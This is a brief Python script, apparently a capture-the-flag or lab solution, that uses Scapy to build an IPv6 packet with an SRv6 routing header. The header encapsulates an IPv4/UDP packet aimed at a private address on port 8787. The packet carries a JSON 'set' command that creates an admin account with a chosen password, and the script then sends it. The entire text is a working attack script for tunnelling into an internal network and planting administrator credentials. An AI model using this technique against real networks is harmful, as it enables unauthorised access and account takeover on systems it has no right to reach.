from scapy.all import *
from scapy.layers.inet6 import IPv6, IPv6ExtHdrRouting
from scapy.layers.inet import IP, TCP

src_ipv6 = "2401:c080:1000:449a:5400:3ff:fed7:649f"
dst_ipv6 = "2407:9240:3100:e020:1::"

segment_list = [
        "2407:9240:3100:e020:1::"
]

ip6_hdr = IPv6(src=src_ipv6, dst=dst_ipv6)

srh = IPv6ExtHdrRouting(
    nh=4,  # Next Header 4 == IPv4
    type=4,  # Routing Header 4 == SRv6
    segleft=len(segment_list) - 1,
    addresses=segment_list
)

src_ipv4 = "207.148.88.142"
dst_ipv4 = "192.168.110.1"
inner_ipv4_hdr = IP(src=src_ipv4, dst=dst_ipv4) / UDP(dport=8787, sport=12345)

payload = json.dumps({'command': 'set', 'data': {"username": "admin", "password": "meow", "admin": True}}).encode('utf-8')
packet = ip6_hdr / srh / inner_ipv4_hdr / payload

packet.show()

send(packet)
